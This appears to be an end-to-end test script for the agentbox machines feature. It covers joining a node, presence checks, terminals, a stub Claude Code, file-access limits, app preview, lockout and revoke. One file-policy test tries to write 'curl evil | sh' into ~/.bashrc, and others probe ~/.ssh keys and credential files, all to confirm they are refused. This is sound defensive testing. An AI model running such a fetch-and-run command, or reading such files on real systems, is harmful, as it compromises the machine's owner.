#!/usr/bin/env node
// Machines, end to end: the compiled gate with machines on, behind a small
// stand-in for the proxy (it names the box's host and the client's address,
// as Caddy does), and a "machine" — the built CLI bundle in a home folder of
// its own — joining it the way the owner would.
//
//   join (typed code, passphrase on stdin) → online with specs → survives a
//   gate restart → offline on network loss and back → a copied token is
//   refused as a duplicate → pause / resume → presence → a terminal runs a
//   command → a stub Claude Code through the shim, with the shared token →
//   terminals: false closes the terminal → Files: read and write in an
//   allowed folder, ~/.bashrc and the node's folder refused, ~/.ssh hidden, a
//   link out refused → agentbox-preview: a tiny server loads on the
//   machine-apps host under the app policy → five wrong passphrases lock →
//   revoke stops it, wiping only secrets/.
//
//   npm run build            (in web/)
//   node e2e/machines.mjs    (in web/cli) [--keep]
//
// Needs herdr on PATH, installed by scripts/install-herdr.sh (the node checks
// it against the same pin).
import { spawn } from "node:child_process";
import { createHmac, pbkdf2Sync, randomBytes } from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import net from "node:net";
import os from "node:os";
import path from "node:path";
import { WebSocket } from "ws";
import { bundle, cliDir, freePort, waitForPort, which } from "./stack.mjs";

const keep = process.argv.includes("--keep");
const webDir = path.resolve(cliDir, "..");
const gateEntry = path.join(webDir, "gate", "dist", "main.js");
const gateCli = path.join(webDir, "gate", "dist", "cli.js");
for (const f of [gateEntry, bundle]) if (!fs.existsSync(f)) throw new Error(`missing ${f}; run npm run build in web/ first`);
const herdr = which("herdr");
if (!herdr) throw new Error("herdr is not on PATH (scripts/install-herdr.sh)");

const MAIN = "box.example.test";
const MACHINES = "machines.example.test";
const USER = "e2e";
const PASSWORD = "e2e-password-1";
const PASSPHRASE = "machines passphrase for e2e";
// The address the stand-in proxy says the machine came from.
const MACHINE_IP = "203.0.113.7";

const root = fs.mkdtempSync(path.join(os.tmpdir(), "agentbox-machines-e2e-"));
const gateData = path.join(root, "gate");
fs.mkdirSync(gateData);
const ports = { gate: await freePort(), apps: await freePort(), proxy: await freePort(), unused: await freePort() };
const { hashPassword } = await import(path.join(webDir, "gate", "dist", "password.js"));
const gateEnv = {
  PATH: process.env.PATH,
  GATE_HOST: "127.0.0.1",
  GATE_PORT: String(ports.gate),
  GATE_DATA_DIR: gateData,
  GATE_ADMIN_SOCKET: path.join(root, "gate-admin.sock"),
  GATE_UPSTREAM_HOST: "127.0.0.1",
  GATE_APPS_HOST: "127.0.0.1",
  GATE_APPS_PORT: String(ports.apps),
  ...Object.fromEntries(["CODE", "TERMINAL", "SHELL", "MONITOR", "BRIDGE", "DATA"].map((n) => [`GATE_${n}_PORT`, String(ports.unused)])),
  GATE_TRUSTED_PROXIES: "127.0.0.1",
  AGENTBOX_PUBLIC_URL: `https://${MAIN}`,
  AGENTBOX_MACHINES_HOST: MACHINES,
  AGENTBOX_MACHINE_APPS_HOST: "mapps.example.test",
  AGENTBOX_USER: USER,
  AGENTBOX_PASSWORD_HASH: await hashPassword(PASSWORD, 4),
};

const children = [];
function spawnLogged(name, cmd, args, env, input) {
  const child = spawn(cmd, args, { env, stdio: ["pipe", "pipe", "pipe"] });
  const out = { text: "" };
  child.stdout.on("data", (c) => (out.text += c));
  child.stderr.on("data", (c) => (out.text += c));
  if (input !== undefined) child.stdin.end(input);
  const exited = new Promise((r) => child.on("exit", (code) => r(code)));
  const p = { name, child, out, exited };
  children.push(p);
  return p;
}

let gate = null;
async function startGate() {
  gate = spawnLogged("gate", process.execPath, [gateEntry], gateEnv);
  await waitForPort(ports.gate);
}
async function stopGate() {
  gate.child.kill("SIGTERM");
  await gate.exited;
}

// --- the stand-in proxy: the box's host, the client's address, https ---------------
let down = false;
const live = new Set();
const proxyHeaders = (h) => ({ ...h, host: MAIN, "x-forwarded-proto": "https", "x-agentbox-client-ip": MACHINE_IP });
const proxy = http.createServer((req, res) => {
  if (down) return req.socket.destroy();
  const up = http.request({ host: "127.0.0.1", port: ports.gate, method: req.method, path: req.url, headers: proxyHeaders(req.headers) }, (r) => {
    res.writeHead(r.statusCode ?? 502, r.headers);
    r.pipe(res);
  });
  up.on("error", () => res.destroy());
  req.pipe(up);
});
proxy.on("connection", (s) => {
  if (down) return s.destroy();
  live.add(s);
  s.on("close", () => live.delete(s));
});
proxy.on("upgrade", (req, socket, head) => {
  if (down) return socket.destroy();
  const up = net.connect(ports.gate, "127.0.0.1", () => {
    const lines = [`${req.method} ${req.url} HTTP/1.1`];
    for (const [k, v] of Object.entries(proxyHeaders(req.headers))) for (const one of [v].flat()) lines.push(`${k}: ${one}`);
    up.write(`${lines.join("\r\n")}\r\n\r\n`);
    up.write(head);
    up.pipe(socket);
    socket.pipe(up);
  });
  live.add(up);
  up.on("close", () => {
    live.delete(up);
    socket.destroy();
  });
  socket.on("close", () => up.destroy());
  up.on("error", () => socket.destroy());
  socket.on("error", () => up.destroy());
});
await new Promise((r) => proxy.listen(ports.proxy, "127.0.0.1", r));
const boxUrl = `http://127.0.0.1:${ports.proxy}`;

// --- the owner's browser on the machines origin --------------------------------------
function call(method, p, { host = MACHINES, headers = {}, body } = {}) {
  const payload = body === undefined ? undefined : JSON.stringify(body);
  return new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: "127.0.0.1",
        port: ports.gate,
        method,
        path: p,
        headers: { host, ...(payload ? { "content-type": "application/json", "content-length": Buffer.byteLength(payload) } : {}), ...headers },
      },
      (res) => {
        let text = "";
        res.on("data", (c) => (text += c));
        res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, text, json: () => JSON.parse(text) }));
      },
    );
    req.on("error", reject);
    req.end(payload);
  });
}
const cookieOf = (res) => String(res.headers["set-cookie"]?.[0] ?? "").split(";")[0];
let machinesCookie = "";
async function signIn() {
  const login = await call("POST", "/_gate/login", { host: MAIN, headers: { origin: `https://${MAIN}` }, body: { username: USER, password: PASSWORD } });
  if (login.status !== 200) throw new Error(`main sign-in: ${login.status} ${login.text}`);
  const handoff = await call("GET", "/_gate/machines/handoff", { host: MAIN, headers: { cookie: cookieOf(login) } });
  const nonce = /n=([A-Za-z0-9_-]+)/.exec(String(handoff.headers.location))?.[1];
  const signin = await call("POST", "/signin", { headers: { origin: `https://${MACHINES}` }, body: { nonce, passphrase: PASSPHRASE } });
  if (signin.status !== 200) throw new Error(`machines sign-in: ${signin.status} ${signin.text}`);
  machinesCookie = cookieOf(signin);
}
const mget = async (p) => (await call("GET", p, { headers: { cookie: machinesCookie } })).json();
const mpost = (p, body = {}) => call("POST", p, { headers: { cookie: machinesCookie, origin: `https://${MACHINES}` }, body });
const machine = async () => (await mget("/_gate/machines/list")).machines[0];

// --- the machine ---------------------------------------------------------------------------
function machineEnv(home) {
  return { PATH: process.env.PATH, HOME: home, LANG: "C.UTF-8", AGENTBOX_NODE_HERDR_FROM: herdr };
}
const homeA = path.join(root, "laptop");
const homeB = path.join(root, "copied");
for (const h of [homeA, homeB, path.join(homeA, "code")]) fs.mkdirSync(h, { recursive: true });
const nodeDirOf = (home) => path.join(home, ".local", "share", "agentbox", "node");
const cli = (home, args, input) => spawnLogged(`agentbox ${args.join(" ")}`, process.execPath, [bundle, ...args], machineEnv(home), input);

async function until(what, cond, ms = 30_000) {
  const end = Date.now() + ms;
  for (;;) {
    const v = await cond();
    if (v) return v;
    if (Date.now() > end) throw new Error(`timed out waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 200));
  }
}
function assert(cond, message) {
  if (!cond) throw new Error(message);
}

let failures = 0;
async function step(name, fn) {
  const t = Date.now();
  try {
    await fn();
    console.log(`ok    machines: ${name} (${Date.now() - t} ms)`);
  } catch (err) {
    failures += 1;
    console.log(`FAIL  machines: ${name}\n      ${String(err.stack ?? err).split("\n").join("\n      ")}`);
    throw err;
  }
}

let run = null;
try {
  await startGate();
  await step("machines enable: the passphrase reaches the gate on stdin", async () => {
    const set = spawnLogged("gate cli", process.execPath, [gateCli, "machines-passphrase"], gateEnv, `${PASSPHRASE}\n`);
    assert((await set.exited) === 0, set.out.text);
    await signIn();
  });

  await step("join: a typed code, the address the gate saw, a token once", async () => {
    // Never the real Claude Code here: a stub stands in for it below.
    const join = cli(homeA, ["node", "join", boxUrl, "--name", "e2e-laptop", "--folder", path.join(homeA, "code"), "--no-service", "--no-claude"], `${PASSPHRASE}\n${PASSPHRASE}\n`);
    const code = await until("the code on the machine's screen", () => /\n {4}([A-Z]{4}-[A-Z]{4})\n/.exec(join.out.text)?.[1]);
    const pending = (await mget("/_gate/machines/joins")).joins;
    assert(pending.length === 1 && pending[0].name === "e2e-laptop" && pending[0].ip === MACHINE_IP, `pending: ${JSON.stringify(pending)}`);
    assert(!JSON.stringify(pending).includes(code), "the pending list carries the code");
    assert((await mpost("/_gate/machines/joins/approve", { code: "BCDF-GHJK" })).status === 404, "a wrong code approved something");
    assert((await mpost("/_gate/machines/joins/approve", { code })).status === 200, "approving failed");
    assert((await join.exited) === 0, join.out.text);
    const dir = nodeDirOf(homeA);
    const creds = JSON.parse(fs.readFileSync(path.join(dir, "credentials.json"), "utf8"));
    assert(/^abn_/.test(creds.token) && creds.presence.iterations === 600000, "credentials");
    assert((fs.statSync(path.join(dir, "credentials.json")).mode & 0o777) === 0o600, "credentials are not 0600");
    assert((fs.statSync(dir).mode & 0o777) === 0o700, "the node folder is not 0700");
    assert(JSON.parse(fs.readFileSync(path.join(dir, "policy.json"), "utf8")).files[0].path === path.join(homeA, "code"), "policy");
    assert(fs.existsSync(path.join(dir, "bin", "herdr")), "herdr was not installed");
    assert(!join.out.text.includes(creds.token), "the token was printed");
  });

  await step("run: online, with its specs", async () => {
    run = cli(homeA, ["node", "run"]);
    const m = await until("online", async () => ((await machine())?.state === "online" ? machine() : null));
    assert(m.specs.hostname === os.hostname() && m.specs.cpu.cores > 0 && m.specs.policy.files.length === 1, JSON.stringify(m.specs));
    const status = cli(homeA, ["node", "status", "--json"]);
    await status.exited;
    assert(JSON.parse(status.out.text).state === "online", status.out.text);
  });

  await step("survives a gate restart", async () => {
    await stopGate();
    await startGate();
    // The machines session is in the store, and outlives the restart too.
    await until("online again", async () => (await machine())?.state === "online", 60_000);
  });

  await step("offline on network loss, and back", async () => {
    down = true;
    for (const s of live) s.destroy();
    await until("offline", async () => (await machine())?.state === "offline");
    down = false;
    await until("online again", async () => (await machine())?.state === "online", 90_000);
  });

  await step("a copied token is refused as a duplicate while the first answers", async () => {
    const dirB = nodeDirOf(homeB);
    fs.mkdirSync(dirB, { recursive: true, mode: 0o700 });
    for (const f of ["credentials.json", "policy.json"]) fs.copyFileSync(path.join(nodeDirOf(homeA), f), path.join(dirB, f));
    const copy = cli(homeB, ["node", "run"]);
    await until("the duplicate refused", async () => (await machine())?.duplicateAt !== null);
    await until("the copy told", () => copy.out.text.includes("already linked from elsewhere"));
    assert((await machine()).state === "online", "the first link went down");
    copy.child.kill("SIGTERM");
    await copy.exited;
    const audit = await mget("/_gate/machines/audit");
    assert(audit.events.some((e) => e.kind === "duplicate"), "no duplicate in the audit log");
  });

  await step("pause → paused on the machine; resume → online", async () => {
    const pause = cli(homeA, ["node", "pause"]);
    assert((await pause.exited) === 0, pause.out.text);
    await until("paused", async () => (await machine())?.state === "paused");
    assert(JSON.parse(fs.readFileSync(path.join(nodeDirOf(homeA), "policy.json"), "utf8")).paused === true, "policy.json not paused");
    const resume = cli(homeA, ["node", "resume"]);
    assert((await resume.exited) === 0, resume.out.text);
    await until("online", async () => (await machine())?.state === "online");
  });


  // --- agents and terminals, behind presence ------------------------------------------
  const mid = (await machine()).id;
  const M_ORIGIN = `https://${MACHINES}`;
  const rpc = (method, params = {}) => mpost(`/m/${mid}/api/rpc`, { method, params });
  const answerFor = (passphrase, c) =>
    createHmac("sha256", pbkdf2Sync(passphrase, Buffer.from(c.salt, "base64url"), c.iterations, 32, "sha256"))
      .update(Buffer.concat([Buffer.from(c.challenge, "base64url"), Buffer.from(c.session + c.machine)]))
      .digest("base64url");
  const prove = async (passphrase) => {
    const c = await mpost(`/_gate/machines/m/${mid}/presence/challenge`);
    if (c.status !== 200) return c;
    return mpost(`/_gate/machines/m/${mid}/presence`, { challenge: c.json().challenge, answer: answerFor(passphrase, c.json()) });
  };
  /** A terminal on `pane`, through the gate and the link: its screen, as text, as it comes. */
  const terminal = (pane) =>
    new Promise((resolve, reject) => {
      const ws = new WebSocket(`ws://127.0.0.1:${ports.gate}/m/${mid}/ws/terminal?pane=${encodeURIComponent(pane)}&cols=100&rows=30`, {
        headers: { host: MACHINES, origin: M_ORIGIN, cookie: machinesCookie },
      });
      // The screen comes as herdr renders it: spaces are often cursor moves, so compare without them.
      const t = { ws, text: "", closedAt: null };
      ws.on("message", (data, binary) => {
        if (binary) t.text += data.toString("utf8").replace(/\x1b\[[0-9;?]*[ -/]*[@-~]|\x1b[()][0-9A-Za-z]|\x1b[=>]/g, "");
      });
      ws.on("close", () => (t.closedAt = Date.now()));
      ws.once("open", () => resolve(t));
      ws.once("unexpected-response", (_q, res) => reject(new Error(`terminal refused: ${res.statusCode}`)));
      ws.once("error", reject);
    });
  const type = (t, text) => t.ws.send(JSON.stringify({ type: "input", text }));
  let pane = null;
  let term = null;

  await step("presence: nothing of herdr's without it; the passphrase proves it", async () => {
    const before = await rpc("ping");
    assert(before.status === 401 && before.json().error === "presence", `before presence: ${before.status} ${before.text}`);
    const ok = await prove(PASSPHRASE);
    assert(ok.status === 200, `presence: ${ok.status} ${ok.text}`);
    assert(!ok.text.includes("pg_"), "the grant reached the page");
  });

  await step("a workspace, and its terminal runs a command", async () => {
    const created = await until("herdr up on the machine", async () => {
      const r = await rpc("workspace.create", { cwd: path.join(homeA, "code") });
      return r.status === 200 ? r.json() : null;
    });
    pane = created.result.root_pane.pane_id;
    const session = await mget(`/m/${mid}/api/session`);
    assert(session.workspaces.some((w) => w.workspace_id === created.result.workspace.workspace_id), "the workspace is not in the session");
    term = await terminal(pane);
    await new Promise((r) => setTimeout(r, 500));
    type(term, "echo ok-$((40+2))\r");
    await until("ok-42 on the screen", () => term.text.includes("ok-42"), 20_000);
  });

  await step("Claude Code through the shim, with the shared token when opted in", async () => {
    const dir = nodeDirOf(homeA);
    // A stub stands in for Claude Code: it says what it was started with.
    fs.writeFileSync(
      path.join(dir, "bin", "claude"),
      '#!/bin/sh\necho "stub-claude token=$([ -n "$CLAUDE_CODE_OAUTH_TOKEN" ] && echo set || echo none) prompt=$([ "$1" = --append-system-prompt-file ] && [ -f "$2" ] && echo yes || echo no) config=${CLAUDE_CONFIG_DIR##*/}"\n',
      { mode: 0o755 },
    );
    // Generated here; never a real token.
    const token = `e2e-${randomBytes(16).toString("hex")}`;
    assert((await mpost("/_gate/machines/claude-token", { token })).status === 200, "setting the token failed");
    assert((await mpost(`/_gate/machines/m/${mid}/opt-in`, { claudeToken: true })).status === 200, "opting in failed");
    const file = path.join(dir, "secrets", "claude-token");
    await until("the token on the machine", () => fs.existsSync(file) && fs.readFileSync(file, "utf8") === token);
    assert((fs.statSync(file).mode & 0o777) === 0o600, "secrets/claude-token is not 0600");
    assert(!run.out.text.includes(token), "the token is in the node's log");
    type(term, "claude hello\r");
    await until("the stub's line", () => term.text.replace(/\s+/g, "").includes("stub-claudetoken=setprompt=yesconfig=claude"), 20_000).catch((err) => {
      throw new Error(`${err.message}; the screen said: ${term.text.slice(-600)}`);
    });
    const seed = JSON.parse(fs.readFileSync(path.join(dir, "claude", ".claude.json"), "utf8"));
    assert(seed.hasCompletedOnboarding === true && seed.projects[homeA].hasTrustDialogAccepted === true, JSON.stringify(seed));
  });

  await step("terminals: false closes the open terminal within 2 s, and refuses another", async () => {
    const file = path.join(nodeDirOf(homeA), "policy.json");
    const policy = JSON.parse(fs.readFileSync(file, "utf8"));
    const t = Date.now();
    fs.writeFileSync(file, JSON.stringify({ ...policy, terminals: false }));
    await until("the terminal closed", () => term.closedAt !== null, 10_000);
    assert(term.closedAt - t <= 3_000, `closed after ${term.closedAt - t} ms`);
    const r = await rpc("ping");
    assert(r.status === 403 && r.json().error === "terminals_off", `${r.status} ${r.text}`);
    fs.writeFileSync(file, JSON.stringify(policy));
    await until("terminals back", async () => (await rpc("ping")).status === 200);
  });

  // --- files and preview ------------------------------------------------------------------
  const APPS_HOST = gateEnv.AGENTBOX_MACHINE_APPS_HOST;
  const files = (method, p, body) => (method === "GET" ? call("GET", `/m/${mid}${p}`, { headers: { cookie: machinesCookie } }) : mpost(`/m/${mid}${p}`, body));
  const q = (p) => encodeURIComponent(p);
  const policyFile = path.join(nodeDirOf(homeA), "policy.json");
  const firstPolicy = fs.readFileSync(policyFile, "utf8");

  await step("files: read and write in an allowed folder", async () => {
    const code = path.join(homeA, "code");
    const w = await files("POST", "/api/files/write", { path: path.join(code, "hello.txt"), content: "hi from the browser\n" });
    assert(w.status === 200, `write: ${w.status} ${w.text}`);
    assert(fs.readFileSync(path.join(code, "hello.txt"), "utf8") === "hi from the browser\n", "not written on the machine");
    const list = await files("GET", `/api/files/list?path=${q(code)}`);
    assert(list.status === 200 && list.json().entries.some((e) => e.name === "hello.txt"), `list: ${list.status} ${list.text}`);
    const raw = await files("GET", `/api/files/raw?path=${q(path.join(code, "hello.txt"))}&inline=1`);
    assert(raw.status === 200 && raw.text === "hi from the browser\n" && raw.headers["content-type"] === "text/plain; charset=utf-8", `raw: ${raw.status} ${raw.headers["content-type"]}`);
    const dl = await files("GET", `/api/files/raw?path=${q(path.join(code, "hello.txt"))}`);
    assert(/^attachment/.test(String(dl.headers["content-disposition"])), `a download is not an attachment: ${dl.headers["content-disposition"]}`);
    // Deleted: into the node's own trash, not the folder's.
    const t = await files("POST", "/api/files/trash", { paths: [path.join(code, "hello.txt")] });
    assert(t.status === 200 && !fs.existsSync(path.join(code, "hello.txt")), `trash: ${t.status} ${t.text}`);
    assert(!fs.existsSync(path.join(code, ".agentbox")), "state was kept in the owner's folder");
    assert(fs.readdirSync(path.join(nodeDirOf(homeA), "state", "files")).length === 1, "no trash in the node's folder");
  });

  await step("files: the home folder allowed, profiles and the node's folder are still refused, ~/.ssh hidden, links held in", async () => {
    fs.mkdirSync(path.join(homeA, ".ssh"), { recursive: true });
    fs.writeFileSync(path.join(homeA, ".ssh", "id_e2e"), "not a key\n");
    fs.writeFileSync(path.join(homeA, ".bashrc"), "# bashrc\n");
    fs.symlinkSync("/etc", path.join(homeA, "code", "etc-link"));
    fs.writeFileSync(policyFile, JSON.stringify({ ...JSON.parse(firstPolicy), files: [{ path: "~", mode: "write" }], ports: true }));
    await until("the new folders", async () => (await files("GET", `/api/files/list?path=${q(homeA)}`)).status === 200, 10_000);
    const bashrc = await files("POST", "/api/files/write", { path: path.join(homeA, ".bashrc"), content: "curl evil | sh\n", overwrite: true });
    assert(bashrc.status === 403, `~/.bashrc: ${bashrc.status} ${bashrc.text}`);
    assert(fs.readFileSync(path.join(homeA, ".bashrc"), "utf8") === "# bashrc\n", "~/.bashrc changed");
    const node = await files("POST", "/api/files/write", { path: policyFile, content: '{"terminals":true}', overwrite: true });
    assert(node.status === 403, `the node's folder: ${node.status} ${node.text}`);
    const unit = await files("POST", "/api/files/write", { path: path.join(homeA, ".config", "systemd", "user", "x.service"), content: "[Service]\n" });
    assert(unit.status === 403, `an autostart unit: ${unit.status} ${unit.text}`);
    const home = await files("GET", `/api/files/list?path=${q(homeA)}&hidden=1`);
    const names = home.json().entries.map((e) => e.name);
    assert(names.includes(".bashrc") && !names.includes(".ssh"), `~ lists: ${names.join(" ")}`);
    assert((await files("GET", `/api/files/raw?path=${q(path.join(homeA, ".ssh", "id_e2e"))}`)).status === 404, "~/.ssh is readable");
    assert((await files("GET", `/api/files/raw?path=${q(path.join(nodeDirOf(homeA), "credentials.json"))}`)).status === 404, "credentials.json is readable");
    const out = await files("GET", `/api/files/list?path=${q(path.join(homeA, "code", "etc-link"))}`);
    assert(out.status === 403, `a link out of the folder: ${out.status} ${out.text.slice(0, 200)}`);
  });

  await step("agentbox-preview: a tiny server on the machine loads on the machine-apps host, under the app policy", async () => {
    const appPort = await freePort();
    const app = http.createServer((req, res) => {
      res.writeHead(200, { "content-type": "text/html", "set-cookie": "sid=1; Path=/" });
      res.end(`<!doctype html><title>tiny</title><p id="tiny">tiny app ${req.url}</p>`);
    });
    await new Promise((r) => app.listen(appPort, "127.0.0.1", r));
    try {
      const shim = path.join(nodeDirOf(homeA), "shims", "agentbox-preview");
      const reg = spawnLogged("agentbox-preview", shim, [String(appPort), "--name", "tiny"], machineEnv(homeA));
      assert((await reg.exited) === 0, reg.out.text);
      const listed = await until("the app on the machines page", async () => (await mget(`/_gate/machines/m/${mid}/apps`)).apps.find((a) => a.port === appPort));
      assert(listed.url === `https://${APPS_HOST}/${listed.id}/`, JSON.stringify(listed));
      // Nothing without opening it from the machines page.
      assert((await call("GET", `/${listed.id}/`, { host: APPS_HOST })).status === 404, "the app opened without a grant");
      const opened = await mpost(`/_gate/machines/m/${mid}/apps/${listed.id}/open`);
      const enter = new URL(opened.json().url);
      const e = await call("GET", `${enter.pathname}${enter.search}`, { host: APPS_HOST });
      assert(e.status === 303, `enter: ${e.status} ${e.text}`);
      const grant = cookieOf(e);
      const page = await call("GET", `/${listed.id}/hello`, { host: APPS_HOST, headers: { cookie: grant, "sec-fetch-dest": "document" } });
      assert(page.status === 200 && page.text.includes("tiny app /hello"), `page: ${page.status} ${page.text.slice(0, 200)}`);
      const csp = [page.headers["content-security-policy"]].flat().join(" | ");
      assert(csp.includes("sandbox allow-scripts") && csp.includes(`frame-ancestors https://${MACHINES}`), `csp: ${csp}`);
      assert(String(page.headers["set-cookie"]) === `sid=1; Path=/${listed.id}/; Secure; SameSite=None`, `cookie: ${page.headers["set-cookie"]}`);
      assert(page.headers["access-control-allow-origin"] === undefined, "CORS for a named origin");
      // A port nobody registered is never reached, nor is the node's own API from an app.
      const list = cli(homeA, ["node", "preview", "list", "--json"]);
      await list.exited;
      assert(JSON.parse(list.out.text).apps.length === 1, list.out.text);
    } finally {
      app.close();
    }
  });

  fs.writeFileSync(policyFile, firstPolicy);

  await step("five wrong passphrases in a row lock presence, the right one included", async () => {
    for (let i = 1; i <= 4; i++) {
      const r = await prove(`wrong passphrase ${i}`);
      assert(r.status === 401 && r.json().error === "wrong", `wrong ${i}: ${r.status} ${r.text}`);
    }
    const fifth = await prove("wrong passphrase 5");
    assert(fifth.status === 429 && fifth.json().error === "locked", `fifth: ${fifth.status} ${fifth.text}`);
    const right = await prove(PASSPHRASE);
    assert(right.status === 429, `the right passphrase while locked: ${right.status}`);
    await until("said on the machine", () => run.out.text.includes("locked for 15 minutes"));
  });

  await step("revoke: the node stops, wiping secrets/ and nothing else", async () => {
    const dir = nodeDirOf(homeA);
    assert(fs.existsSync(path.join(dir, "secrets", "claude-token")), "no shared token to wipe");
    const id = (await machine()).id;
    assert((await mpost(`/_gate/machines/m/${id}/revoke`)).status === 200, "revoke failed");
    const code = await Promise.race([run.exited, new Promise((r) => setTimeout(() => r("still running"), 20_000))]);
    assert(code === 0, `node run: ${code}\n${run.out.text.slice(-2000)}`);
    assert(!fs.existsSync(path.join(dir, "secrets")), "secrets/ is still there");
    for (const f of ["credentials.json", "policy.json", "bin/herdr"]) assert(fs.existsSync(path.join(dir, f)), `${f} was deleted`);
    assert(typeof JSON.parse(fs.readFileSync(path.join(dir, "credentials.json"), "utf8")).revokedAt === "number", "not marked revoked");
    assert((await machine()).state === "revoked", "the box does not show it revoked");
    // Started again (a reboot), it says so and does nothing.
    const again = cli(homeA, ["node", "run"]);
    assert((await again.exited) === 0 && again.out.text.includes("revoked"), again.out.text);
  });
} catch {
  // Reported by step().
} finally {
  for (const { child } of children) if (child.exitCode === null) child.kill("SIGKILL");
  // The nodes' herdr servers outlive them, by design: end them here.
  for (const home of [homeA, homeB]) {
    let pid = null;
    try {
      pid = JSON.parse(fs.readFileSync(path.join(nodeDirOf(home), "state", "herdr.json"), "utf8")).pid;
      process.kill(pid, "SIGTERM");
    } catch {
      continue; // None started, or gone.
    }
    for (let i = 0; i < 50; i++) {
      try {
        process.kill(pid, 0);
      } catch {
        break;
      }
      await new Promise((r) => setTimeout(r, 100));
    }
  }
  proxy.close();
  if (failures > 0) {
    for (const c of children) console.log(`--- ${c.name}\n${c.out.text.slice(-3000)}`);
  }
  if (!keep) fs.rmSync(root, { recursive: true, force: true });
  else console.log(`state kept in ${root}`);
}
console.log(failures ? `\n${failures} failed` : "\nall machines steps passed");
process.exit(failures ? 1 : 0);
